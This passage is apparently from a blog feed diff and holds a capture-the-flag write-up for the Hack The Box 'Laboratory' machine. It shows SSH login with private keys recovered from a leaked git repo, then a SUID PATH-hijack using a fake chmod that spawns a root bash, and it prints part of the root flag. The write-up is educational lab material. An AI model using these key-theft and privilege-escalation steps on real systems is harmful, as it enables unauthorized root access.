+</code></pre></div><p>Interestingly, this repository contains a set of SSH keys. I can restore the deleted files with <code>git checkout --</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ git checkout --
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ls -la
+total <span class="m">20</span>
+drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
+drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
+</code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
+<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
+<p>At first try, it says the key is invalid format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
+Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
+dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
+</code></pre></div><p>I fixed that by adding an empty string (newline) using the <code>echo</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
+</code></pre></div><p>Now it logs me in.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ ssh -i id_rsa dexter@10.10.10.216
+dexter@laboratory:~$
+dexter@laboratory:~$ id<span class="p">;</span>hostname
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
+laboratory
+dexter@laboratory:~$ ls -l
+total <span class="m">4</span>
+-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ cat dexter/todo.txt
+<span class="c1"># DONE: Secure docker for regular users</span>
+<span class="c1">### DONE: Automate docker security on startup</span>
+<span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
+<span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
+</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+
+<span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
+-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
+</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ ltrace docker-security 
+
+setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
+setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
+system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
+system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
+ &lt;no <span class="k">return</span> ...&gt;
+--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
+<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
+<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
+dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
+</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ which chmod
+/dev/shm/chmod
+</code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dexter@laboratory:/dev/shm$ docker-security 
+root@laboratory:/dev/shm#
+root@laboratory:/dev/shm# cut -c6- /root/root.txt 
+9f593f335a0a1f403c753719eb6
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
 </ul>
 ]]></content:encoded>
     </item>
